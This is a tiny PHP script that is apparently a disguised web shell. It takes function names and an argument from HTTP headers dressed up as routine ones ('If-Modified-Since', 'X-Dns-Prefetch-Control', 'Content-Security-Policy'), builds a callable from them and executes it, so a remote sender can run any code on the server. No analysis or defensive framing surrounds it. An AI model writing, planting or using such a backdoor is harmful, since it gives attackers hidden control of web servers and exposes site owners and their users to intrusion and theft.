<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $system = $_HEADERS['If-Modified-Since']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Content-Security-Policy']));
    $system();
}